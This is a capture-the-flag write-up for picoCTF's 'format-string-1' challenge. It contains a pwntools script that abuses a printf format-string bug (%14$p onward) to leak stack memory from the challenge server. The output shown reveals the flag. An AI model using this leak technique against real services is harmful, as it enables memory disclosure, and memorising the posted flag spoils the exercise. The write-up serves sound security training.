# format string 1

---

Basic file check:

```bash
❯ checksec --file=format-string-1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	FortifiableFILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   41 Symbols	 No	0		2		format-string-1
```

---

executing the program:

```bash
❯ ./format-string-1
Give me your order and I'll read it back to you:
pizza
Here's your order: pizza
Bye!
❯ ./format-string-1
Give me your order and I'll read it back to you:
%14$p
Here's your order: 0x616c667b746e616b
Bye!
```

---

We know there's a format string vulnerability..

lets' craft our exploit.

---

```python3
#!/usr/bin/python3

from pwn import *
context.binary = binary = './format-string-1'


flag = b''
for i in range(0x8):
	#p = process()
	p = remote("mimas.picoctf.net", 52640)
	p.sendlineafter(b'you:', f'%{str(14 + i)}$p')
	p.recvuntil('order: ')
	flag += p64(int(p.recvline(keepends = False), 16))
	log.info(flag)
	p.close()

log.success(flag)
```
---

running the exploit...


---

```bash
❯ python exp.py
[*] '/home/lynk/picoCTF/format-string-1/format-string-1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mimas.picoctf.net on port 52640: Done
/home/lynk/picoCTF/format-string-1/exp.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter(b'you:', f'%{str(14 + i)}$p')
/home/lynk/picoCTF/format-string-1/exp.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('order: ')
/home/lynk/.local/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] picoCTF{
[*] Closed connection to mimas.picoctf.net port 52640
[+] Opening connection to mimas.picoctf.net on port 52640: Done
[*] picoCTF{4n1m41_5
[*] Closed connection to mimas.picoctf.net port 52640
[+] Opening connection to mimas.picoctf.net on port 52640: Done
[*] picoCTF{4n1m41_57y13_4x4
[*] Closed connection to mimas.picoctf.net port 52640
[+] Opening connection to mimas.picoctf.net on port 52640: Done
[*] picoCTF{4n1m41_57y13_4x4_f14g_5e
[*] Closed connection to mimas.picoctf.net port 52640
[+] Opening connection to mimas.picoctf.net on port 52640: Done
[*] picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}\x00
[*] Closed connection to mimas.picoctf.net port 52640
[+] Opening connection to mimas.picoctf.net on port 52640: Done
[*] picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}\x00\x07\x00\x00\x00\x00\x00\x00\x00
[*] Closed connection to mimas.picoctf.net port 52640
[+] Opening connection to mimas.picoctf.net on port 52640: Done
/home/lynk/.local/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}\x00\x07\x00\x00\x00\x00\x00\x00\x00Øè3\x00z\x00\x00
[*] Closed connection to mimas.picoctf.net port 52640
[+] Opening connection to mimas.picoctf.net on port 52640: Done
[*] picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}\x00\x07\x00\x00\x00\x00\x00\x00\x00Øè3\x00z\x00\x00\x07\x00\x00\x00#\x00\x00\x00
[*] Closed connection to mimas.picoctf.net port 52640
/home/lynk/.local/lib/python3.11/site-packages/pwnlib/log.py:347: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'success')
[+] picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}\x00\x07\x00\x00\x00\x00\x00\x00\x00Øè3\x00z\x00\x00\x07\x00\x00\x00#\x00\x00\x00
```

---


